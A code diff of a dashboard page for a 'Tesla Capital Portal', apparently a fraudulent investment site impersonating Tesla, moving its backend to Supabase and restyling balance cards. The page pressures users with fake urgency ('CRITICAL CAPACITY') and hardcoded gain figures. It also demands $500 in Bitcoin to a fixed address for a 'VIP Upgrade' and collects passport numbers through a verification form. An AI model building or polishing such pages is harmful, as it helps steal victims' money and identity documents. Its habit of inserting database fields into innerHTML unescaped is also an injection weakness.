@@ -6,11 +6,47 @@
     <title>Tesla Capital Portal - Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         .gradient-card { background: linear-gradient(135deg, #e82127 0%, #901115 100%); }
-        /* Hide scrollbars but preserve scrolling function */
         ::-webkit-scrollbar { display: none; }
+        
+        /* Upgraded Balance Card */
+        .balance-card {
+            background: linear-gradient(145deg, #e82127 0%, #b91c1c 40%, #7f1d1d 100%);
+            box-shadow: 0 10px 40px -10px rgba(232, 33, 39, 0.45), inset 0 1px 0 rgba(255,255,255,0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        .balance-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -30%;
+            width: 180px;
+            height: 180px;
+            background: radial-gradient(circle, rgba(255,255,255,0.12) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        
+        /* Upgraded Profit Card */
+        .profit-card {
+            background: linear-gradient(145deg, #141414 0%, #1a1a1a 100%);
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 8px 30px -8px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.03);
+            position: relative;
+            overflow: hidden;
+        }
+        .profit-card::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #10b981, transparent);
+        }
     </style>
 </head>
 <body class="text-white min-h-screen pb-32">
@@ -23,9 +59,7 @@
                 <input type="text" id="searchInput" placeholder="Search portal actions or assets..." class="bg-transparent w-full focus:outline-none text-sm text-neutral-200 placeholder-neutral-500">
                 <button id="closeSearchBtn" class="text-xs text-neutral-500 hover:text-white uppercase font-bold tracking-tight">Close</button>
             </div>
-            
-            <div id="searchResults" class="bg-[#121212] border border-neutral-800/80 rounded-2xl overflow-hidden hidden max-h-80 overflow-y-auto divide-y divide-neutral-900 shadow-2xl">
-            </div>
+            <div id="searchResults" class="bg-[#121212] border border-neutral-800/80 rounded-2xl overflow-hidden hidden max-h-80 overflow-y-auto divide-y divide-neutral-900 shadow-2xl"></div>
         </div>
     </div>
 
@@ -107,12 +141,9 @@
                     <p class="text-[9px] uppercase tracking-widest text-neutral-500 font-bold">Block Filled</p>
                 </div>
             </div>
-            
-            <!-- Progress Track -->
             <div class="w-full bg-neutral-900 border border-neutral-800 h-2.5 rounded-full overflow-hidden p-0.5">
                 <div id="sharesProgressBar" class="h-full rounded-full bg-gradient-to-r from-[#901115] to-[#E82127] shadow-[0_0_10px_rgba(232,33,39,0.4)] transition-all duration-1000 ease-out" style="width: 87.6%;"></div>
             </div>
-            
             <div class="flex items-center justify-between mt-2 text-[9px] text-neutral-500 font-mono font-medium">
                 <span>POOL STATUS: CRITICAL CAPACITY</span>
                 <span class="animate-pulse text-red-500 font-bold">● LIVE PRIVATE STREAM</span>
@@ -142,45 +173,57 @@
             </div>
         </div>
 
-        <!-- Metric Cards -->
+        <!-- ========== UPGRADED METRIC CARDS ========== -->
         <div class="grid grid-cols-2 gap-4">
-            <div class="gradient-card rounded-2xl p-4 relative shadow-lg">
-                <div class="flex items-center justify-between">
-                    <p class="text-[10px] font-semibold uppercase tracking-wider text-red-200">Total Balance</p>
-                    <span id="balanceEye" onclick="toggleBalanceVisibility()" class="cursor-pointer text-neutral-300 hover:text-white">👁️</span>
+            <!-- Total Balance Card (Upgraded) -->
+            <div class="balance-card rounded-2xl p-5 relative">
+                <div class="flex items-center justify-between mb-1">
+                    <p class="text-[10px] font-semibold uppercase tracking-wider text-red-100/90">Total Balance</p>
+                    <button onclick="toggleBalanceVisibility()" class="text-white/70 hover:text-white transition-colors">
+                        <span id="balanceEye">👁️</span>
+                    </button>
                 </div>
-                <h3 id="totalBalance" class="text-xl font-bold tracking-tight mt-1 text-white">Fetching...</h3>
-                <p class="text-[10px] text-red-200 font-medium mt-2 flex items-center">▲ 5.24% <span class="opacity-60 ml-1">vs last mo</span></p>
+                <h3 id="totalBalance" class="text-2xl font-bold tracking-tight text-white drop-shadow-sm">—</h3>
+                <div class="flex items-center mt-3 space-x-1.5">
+                    <span class="text-[10px] bg-white/15 text-white px-2 py-0.5 rounded-full font-medium">▲ 5.24%</span>
+                    <span class="text-[10px] text-red-100/70">vs last month</span>
+                </div>
             </div>
 
-            <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 shadow-lg">
-                <div class="flex items-center justify-between">
-                    <p class="text-[10px] font-semibold uppercase tracking-wider text-neutral-500">Total Profit</p>
-                    <span id="profitEye" onclick="toggleProfitVisibility()" class="cursor-pointer text-neutral-300 hover:text-white">👁️</span>
+            <!-- Total Profit Card (Upgraded) -->
+            <div class="profit-card rounded-2xl p-5 relative">
+                <div class="flex items-center justify-between mb-1">
+                    <p class="text-[10px] font-semibold uppercase tracking-wider text-neutral-400">Total Profit</p>
+                    <button onclick="toggleProfitVisibility()" class="text-neutral-400 hover:text-white transition-colors">
+                        <span id="profitEye">👁️</span>
+                    </button>
                 </div>
-                <h3 id="totalProfit" class="text-xl font-bold tracking-tight mt-1 text-white">Fetching...</h3>
-                <p class="text-[10px] text-emerald-400 font-medium mt-2 flex items-center">▲ 8.45% <span class="text-neutral-600 ml-1">vs last mo</span></p>
+                <h3 id="totalProfit" class="text-2xl font-bold tracking-tight text-emerald-400">—</h3>
+                <div class="flex items-center mt-3 space-x-1.5">
+                    <span class="text-[10px] bg-emerald-500/15 text-emerald-400 px-2 py-0.5 rounded-full font-medium">▲ 8.45%</span>
+                    <span class="text-[10px] text-neutral-500">vs last month</span>
+                </div>
             </div>
         </div>
 
         <!-- Quick Links Grid -->
         <div class="grid grid-cols-3 gap-2.5">
-            <a href="invest.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+            <a href="invest.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95 hover:border-neutral-700">
                 <span class="text-neutral-400 text-sm font-medium">Invest</span>
             </a>
-            <a href="withdraw.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+            <a href="withdraw.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95 hover:border-neutral-700">
                 <span class="text-neutral-400 text-sm font-medium">Withdraw</span>
             </a>
-            <a href="send.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+            <a href="send.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95 hover:border-neutral-700">
                 <span class="text-neutral-400 text-sm font-medium">Send</span>
             </a>
-            <a href="buyshare.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+            <a href="buyshare.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95 hover:border-neutral-700">
                 <span class="text-neutral-400 text-sm font-medium">Buy Share</span>
             </a>
-            <a href="receive.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+            <a href="receive.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95 hover:border-neutral-700">
                 <span class="text-neutral-400 text-sm font-medium">Receive</span>
             </a>
-            <a href="bills.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+            <a href="bills.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95 hover:border-neutral-700">
                 <span class="text-neutral-400 text-sm font-medium">Bills</span>
             </a>
         </div>
@@ -198,8 +241,7 @@
                     <p class="text-xs text-emerald-400">One-time</p>
                 </div>
             </div>
-            
-            <button onclick="showVipUpgradeModal()" class="mt-6 w-full bg-[#E82127] py-4 rounded-2xl font-medium text-sm">Upgrade Now</button>
+            <button onclick="showVipUpgradeModal()" class="mt-6 w-full bg-[#E82127] py-4 rounded-2xl font-medium text-sm active:scale-[0.98] transition-transform">Upgrade Now</button>
         </div>
 
         <!-- Account Verification -->
@@ -221,7 +263,7 @@
             </p>
         </div>
 
-        <!-- Chart Card (Updated) -->
+        <!-- Chart Card -->
         <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 space-y-3 shadow-xl">
             <div class="flex items-center justify-between">
                 <div>
@@ -271,176 +313,210 @@
             </div>
         </div>
 
-        <!-- Futures & Watchlist -->
-        <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 space-y-4">
-            <div class="flex border-b border-neutral-800">
-                <button onclick="switchTab(0)" id="tabFutures" class="flex-1 py-3 text-sm font-medium border-b-2 border-red-600 text-white">Futures</button>
-                <button onclick="switchTab(1)" id="tabWatchlist" class="flex-1 py-3 text-sm font-medium text-neutral-400">Watchlist</button>
-                <button onclick="switchTab(2)" id="tabNews" class="flex-1 py-3 text-sm font-medium text-neutral-400">News</button>
-            </div>
-
-            <div id="futuresContent">
-                <div class="grid grid-cols-5 text-xs text-neutral-400 pb-2 border-b border-neutral-800">
-                    <div class="col-span-2">Symbol</div>
-                    <div>Last Price</div>
-                    <div>Change</div>
-                    <div>Change %</div>
-                </div>
-                <div class="space-y-3 pt-3">
-                    <div class="flex items-center text-sm">
-                        <div class="flex-1 font-medium">TSLA</div>
-                        <div class="flex-1">$254.85</div>
-                        <div class="flex-1 text-emerald-400">+12.45</div>
-                        <div class="flex-1 text-emerald-400">+5.13%</div>
-                    </div>
-                    <div class="flex items-center text-sm">
-                        <div class="flex-1 font-medium">NASDAQ 100</div>
-                        <div class="flex-1">18,892.25</div>
-                        <div class="flex-1 text-emerald-400">+96.75</div>
-                        <div class="flex-1 text-emerald-400">+0.51%</div>
-                    </div>
-                    <div class="flex items-center text-sm">
-                        <div class="flex-1 font-medium">S&P 500</div>
-                        <div class="flex-1">5,345.75</div>
-                        <div class="flex-1 text-emerald-400">+23.50</div>
-                        <div class="flex-1 text-emerald-400">+0.44%</div>
-                    </div>
-                    <div class="flex items-center text-sm">
-                        <div class="flex-1 font-medium">Dow Jones</div>
-                        <div class="flex-1">38,932.00</div>
-                        <div class="flex-1 text-red-400">-45.00</div>
-                        <div class="flex-1 text-red-400">-0.12%</div>
-                    </div>
-                    <div class="flex items-center text-sm">
-                        <div class="flex-1 font-medium">Gold</div>
-                        <div class="flex-1">2,385.40</div>
-                        <div class="flex-1 text-emerald-400">+17.10</div>
-                        <div class="flex-1 text-emerald-400">+0.72%</div>
-                    </div>
-                </div>
-            </div>
-
-            <button onclick="viewAllFutures()" class="w-full py-3.5 text-center bg-neutral-800 rounded-2xl text-sm font-medium hover:bg-neutral-700">
-                View All Futures
-            </button>
-        </div>
-
-        <!-- Transactions History -->
-        <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 space-y-4 shadow-xl">
+        <!-- Transactions Section -->
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 space-y-3">
             <div class="flex items-center justify-between">
-                <h4 class="text-xs font-bold uppercase tracking-wider text-neutral-400">Transaction History</h4>
-                <span onclick="loadTransactions()" class="text-[10px] text-[#E82127] hover:text-red-400 font-medium cursor-pointer flex items-center gap-1">
-                    Refresh <span class="text-xs">↻</span>
-                </span>
+                <h4 class="text-xs font-bold uppercase tracking-wider text-neutral-400">Recent Transactions</h4>
             </div>
-            
-            <div id="transactionsList" class="space-y-3 max-h-80 overflow-y-auto pr-1 custom-scroll">
-                <!-- Real transactions will load here -->
-            </div>
-        </div>
-
-        <!-- Frame Footer Accent Banner -->
-        <div class="relative rounded-2xl overflow-hidden p-5 border border-red-900/30 bg-gradient-to-r from-neutral-950 via-[#180506] to-neutral-950 shadow-inner group">
-            <div class="absolute top-0 right-0 p-3 opacity-20 text-red-600 transition-transform duration-700 group-hover:rotate-12">
-                <svg class="w-20 h-20" fill="currentColor" viewBox="0 0 24 24">
-                    <path d="M18.4 10.1C16.9 7.3 14 5.5 10.7 5.5c-4.4 0-8 3.3-8.5 7.6h2.1c.5-3.2 3.2-5.6 6.4-5.6 2.4 0 4.6 1.3 5.7 3.3l-2.6 1.3h6.7V5.5l-2.1 4.6z"/>
-                </svg>
-            </div>
-            <div class="relative z-10 space-y-1.5 max-w-[75%]">
-                <span class="text-[9px] font-bold text-[#E82127] uppercase tracking-widest bg-red-950/60 px-2 py-0.5 rounded-md border border-red-900/40">Exclusive Framework</span>
-                <h3 class="text-sm font-bold tracking-tight text-white mt-1">The Future is Electric</h3>
-                <p class="text-[10px] text-neutral-400 leading-normal">Accelerating sustainable energy expansion via decentralized institutional retail capital asset pipelines.</p>
+            <div id="transactionsList" class="space-y-2">
+                <div class="text-center py-6 text-neutral-500 text-sm">Loading transactions...</div>
             </div>
         </div>
 
     </main>
 
-    <!-- Bottom Navigation Bar -->
-    <div class="fixed bottom-4 left-4 right-4 bg-[#141414]/90 backdrop-blur-md border border-[#222] h-16 rounded-2xl shadow-2xl flex items-center justify-between px-2 z-50 max-w-md mx-auto">
-        <a href="dashboard.html" class="flex flex-col items-center justify-center flex-1 py-1 text-[#E82127]">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path>
-            </svg>
-            <span class="text-[9px] font-bold mt-1 tracking-tight">Home</span>
-        </a>
-        <a href="settings.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path>
-                <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
-            </svg>
-            <span class="text-[9px] font-medium mt-1 tracking-tight">Settings</span>
-        </a>
-        <a href="messages.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors relative">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 002 2v10a2 2 0 002 2z"></path>
-            </svg>
-            <span class="absolute top-1 right-5 bg-[#E82127] text-white text-[8px] font-bold w-3.5 h-3.5 rounded-full flex items-center justify-center border border-[#141414]">3</span>
-            <span class="text-[9px] font-medium mt-1 tracking-tight">Messages</span>
-        </a>
-        <a href="about.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-            </svg>
-            <span class="text-[9px] font-medium mt-1 tracking-tight">About</span>
-        </a>
-        <a href="#" id="logoutBtn" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-500 hover:text-red-400 transition-colors">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path>
-            </svg>
-            <span class="text-[9px] font-medium mt-1 tracking-tight">Exit</span>
-        </a>
-    </div>
+    <!-- Bottom Navigation -->
+    <nav class="fixed bottom-0 left-0 right-0 bg-[#0d0d0d]/95 backdrop-blur-xl border-t border-[#1c1c1c] px-6 py-3 z-40">
+        <div class="max-w-md mx-auto flex items-center justify-between">
+            <a href="dashboard.html" class="flex flex-col items-center space-y-1 text-[#E82127]">
+                <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                <span class="text-[10px] font-medium">Home</span>
+            </a>
+            <a href="messages.html" class="flex flex-col items-center space-y-1 text-neutral-500 hover:text-white transition-colors">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/></svg>
+                <span class="text-[10px] font-medium">Messages</span>
+            </a>
+            <a href="invest.html" class="flex flex-col items-center space-y-1 text-neutral-500 hover:text-white transition-colors">
+                <div class="w-12 h-12 -mt-6 bg-[#E82127] rounded-full flex items-center justify-center shadow-lg shadow-red-900/40">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/></svg>
+                </div>
+            </a>
+            <a href="profile.html" class="flex flex-col items-center space-y-1 text-neutral-500 hover:text-white transition-colors">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
+                <span class="text-[10px] font-medium">Profile</span>
+            </a>
+            <a href="settings.html" class="flex flex-col items-center space-y-1 text-neutral-500 hover:text-white transition-colors">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+                <span class="text-[10px] font-medium">Settings</span>
+            </a>
+        </div>
+    </nav>
 
     <!-- Verification Modal -->
-    <div id="verificationModal" class="hidden fixed inset-0 bg-black/90 z-[300] flex items-center justify-center p-6">
-        <div class="bg-[#141414] border border-[#222] rounded-3xl p-8 w-full max-w-md">
-            <h3 class="text-xl font-bold mb-6">Verify Your Account</h3>
-            <form id="verificationForm" class="space-y-4">
-                <input type="text" id="fullName" placeholder="Full Legal Name" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3">
-                <input type="text" id="idNumber" placeholder="ID / Passport Number" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3">
-                <input type="tel" id="phone" placeholder="Phone Number" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3">
-                <input type="text" id="address" placeholder="Residential Address" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3">
-                <button type="submit" class="w-full bg-[#E82127] py-4 rounded-2xl">Submit for Verification</button>
+    <div id="verificationModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-6 w-full max-w-sm">
+            <h3 class="text-lg font-bold mb-4">Account Verification</h3>
+            <form id="verificationForm" class="space-y-3">
+                <input type="text" placeholder="Full Legal Name" class="w-full bg-[#0d0d0d] border border-neutral-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-neutral-600">
+                <input type="text" placeholder="ID / Passport Number" class="w-full bg-[#0d0d0d] border border-neutral-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-neutral-600">
+                <button type="submit" class="w-full bg-[#E82127] py-3 rounded-xl font-medium text-sm">Submit Verification</button>
             </form>
-            <button onclick="closeVerificationModal()" class="mt-4 w-full text-neutral-400">Cancel</button>
+            <button onclick="closeVerificationModal()" class="w-full mt-3 text-neutral-400 text-sm">Cancel</button>
         </div>
     </div>
 
-    <!-- VIP Upgrade Modal -->
-    <div id="vipModal" class="hidden fixed inset-0 bg-black/90 z-[300] flex items-center justify-center p-6">
-        <div class="bg-[#141414] border border-[#E82127] rounded-3xl p-8 w-full max-w-md text-center">
-            <h3 class="text-2xl font-bold text-[#E82127] mb-2">VIP Upgrade</h3>
-            <p class="text-neutral-400 mb-6">$500 • Unlock Country Banks + Priority Withdrawals</p>
-            
-            <div class="bg-black rounded-2xl p-6 mb-6">
-                <div class="text-center mb-4">
-                    <span class="text-5xl">₿</span>
-                </div>
-                <p class="text-xs text-neutral-500 mb-2">Pay with Bitcoin</p>
-                <div class="bg-white p-2 rounded-xl mx-auto w-fit">
-                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e" class="w-48 h-48">
-                </div>
-                <p id="btcAddress" class="font-mono text-[10px] text-neutral-400 mt-4 break-all">bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e</p>
+    <!-- VIP Modal -->
+    <div id="vipModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-6 w-full max-w-sm text-center">
+            <h3 class="text-lg font-bold mb-2">VIP Upgrade</h3>
+            <p class="text-sm text-neutral-400 mb-4">Send $500 BTC to unlock VIP benefits</p>
+            <div class="bg-white p-2 rounded-xl mx-auto w-fit mb-3">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e" class="w-48 h-48">
             </div>
-
-            <button onclick="copyBtcAddress()" class="w-full bg-neutral-800 py-4 rounded-2xl mb-3">Copy BTC Address</button>
-            <button onclick="closeVipModal()" class="w-full text-neutral-400">Cancel</button>
+            <p id="btcAddress" class="font-mono text-[10px] text-neutral-400 mb-4 break-all">bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e</p>
+            <button onclick="copyBtcAddress()" class="w-full bg-neutral-800 py-3 rounded-xl mb-2 text-sm">Copy BTC Address</button>
+            <button onclick="closeVipModal()" class="w-full text-neutral-400 text-sm">Cancel</button>
         </div>
     </div>
 
     <script>
-        const API_URL = "https://script.google.com/macros/s/AKfycbxMvLEjQRlW8Gveer2mNJf-bnoFsXLVb0wjNdcGkujWwnLVzTf2iDCQI19yVUTi0rtG5w/exec";
+        // ========== SUPABASE CONNECTION ==========
+        const SUPABASE_URL = "https://jawpzkqvcvcrmpirqcma.supabase.co";
+        const SUPABASE_ANON_KEY = "sb_publishable_EAds5LMLdll_0ubbbhw_kg_fJxzlOtH";
+        const { createClient } = supabase;
+        const _supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        // =========================================
+
         const userId = localStorage.getItem("userId");
         const fullName = localStorage.getItem("fullName");
 
-        document.getElementById("logoutBtn").addEventListener("click", (e) => {
-            e.preventDefault();
+        // Auth guard
+        if (!userId) {
+            window.location.href = "index.html";
+        }
+
+        // Logout helper (if you have a logout button)
+        function doLogout() {
             localStorage.removeItem("userId");
             localStorage.removeItem("fullName");
+            localStorage.removeItem("sessionToken");
             localStorage.removeItem("userAvatarImage");
             window.location.href = "index.html";
-        });
+        }
 
+        // ========== LOAD BALANCE + PROFIT ==========
+        async function loadDashboardMetrics() {
+            const balanceEl = document.getElementById('totalBalance');
+            const profitEl = document.getElementById('totalProfit');
+
+            try {
+                const { data: account, error } = await _supabase
+                    .from('accounts')
+                    .select('balance, profit')
+                    .eq('user_id', userId)
+                    .maybeSingle();
+
+                if (error) throw error;
+
+                if (account) {
+                    balanceEl.innerText = formatCurrency(account.balance);
+                    profitEl.innerText = formatCurrency(account.profit);
+                } else {
+                    // No account row yet → show zeros
+                    balanceEl.innerText = formatCurrency(0);
+                    profitEl.innerText = formatCurrency(0);
+                }
+            } catch (err) {
+                console.error("Dashboard metrics error:", err);
+                balanceEl.innerText = "$0.00";
+                profitEl.innerText = "$0.00";
+            }
+        }
+
+        // ========== LOAD TRANSACTIONS ==========
+        async function loadTransactions() {
+            const container = document.getElementById('transactionsList');
+            if (!container) return;
+
+            try {
+                const { data: investments, error } = await _supabase
+                    .from('investments')
+                    .select('id, amount, asset, status, created_at')
+                    .eq('user_id', userId)
+                    .order('created_at', { ascending: false })
+                    .limit(15);
+
+                if (error) throw error;
+
+                if (investments && investments.length > 0) {
+                    container.innerHTML = investments.map(tx => {
+                        const dateStr = tx.created_at 
+                            ? new Date(tx.created_at).toLocaleDateString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })
+                            : '';
+                        return `
+                        <div class="flex items-center justify-between bg-neutral-950/50 rounded-xl p-3 border border-neutral-800">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 text-lg">↓</div>
+                                <div>
+                                    <p class="text-sm font-medium text-neutral-200">${tx.asset || 'Investment'}</p>
+                                    <p class="text-[10px] text-neutral-500 font-mono">${tx.status || 'Pending'}</p>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <p class="text-emerald-400 font-medium font-mono">+$${parseFloat(tx.amount || 0).toFixed(2)}</p>
+                                <p class="text-[10px] text-neutral-500">${dateStr}</p>
+                            </div>
+                        </div>`;
+                    }).join('');
+                } else {
+                    container.innerHTML = `<div class="text-center py-8 text-neutral-500 text-sm">No transactions found yet.</div>`;
+                }
+            } catch (err) {
+                console.error(err);
+                container.innerHTML = `<div class="text-center py-8 text-red-400 text-sm">Could not load transactions.</div>`;
+            }
+        }
+
+        function formatCurrency(val) {
+            const num = parseFloat(String(val).replace(/[^0-9.-]+/g, "")) || 0;
+            return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(num);
+        }
+
+        // ========== UI HELPERS (kept from original) ==========
+        let balanceVisible = true;
+        let profitVisible = true;
+
+        function toggleBalanceVisibility() {
+            balanceVisible = !balanceVisible;
+            document.getElementById('totalBalance').style.opacity = balanceVisible ? '1' : '0.15';
+            document.getElementById('balanceEye').textContent = balanceVisible ? '👁️' : '🙈';
+        }
+
+        function toggleProfitVisibility() {
+            profitVisible = !profitVisible;
+            document.getElementById('totalProfit').style.opacity = profitVisible ? '1' : '0.15';
+            document.getElementById('profitEye').textContent = profitVisible ? '👁️' : '🙈';
+        }
+
+        function showVerificationModal() {
+            document.getElementById('verificationModal').classList.remove('hidden');
+        }
+        function closeVerificationModal() {
+            document.getElementById('verificationModal').classList.add('hidden');
+        }
+        function showVipUpgradeModal() {
+            document.getElementById('vipModal').classList.remove('hidden');
+        }
+        function closeVipModal() {
+            document.getElementById('vipModal').classList.add('hidden');
+        }
+        function copyBtcAddress() {
+            navigator.clipboard.writeText("bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e").then(() => {
+                alert("BTC Address copied!");
+            });
+        }
+
+        // Search
         const searchDatabase = [
             { name: "Tesla Stock Shares (TSLA)", url: "buyshare.html", category: "Assets" },
             { name: "Invest Capital Assets", url: "invest.html", category: "Operations" },
@@ -453,300 +529,96 @@
             { name: "Secure Message Terminal", url: "messages.html", category: "Communication" }
         ];
 
-        const openSearchBtn = document.getElementById("openSearchBtn");
-        const closeSearchBtn = document.getElementById("closeSearchBtn");
-        const searchModal = document.getElementById("searchModal");
-        const searchInput = document.getElementById("searchInput");
-        const searchResults = document.getElementById("searchResults");
-
-        openSearchBtn.addEventListener("click", () => {
-            searchModal.classList.remove("hidden");
+        document.getElementById("openSearchBtn").addEventListener("click", () => {
+            const modal = document.getElementById("searchModal");
+            modal.classList.remove("hidden");
             setTimeout(() => {
-                searchModal.classList.remove("opacity-0");
-                searchModal.classList.add("opacity-100");
-                searchInput.focus();
+                modal.classList.remove("opacity-0");
+                document.getElementById("searchInput").focus();
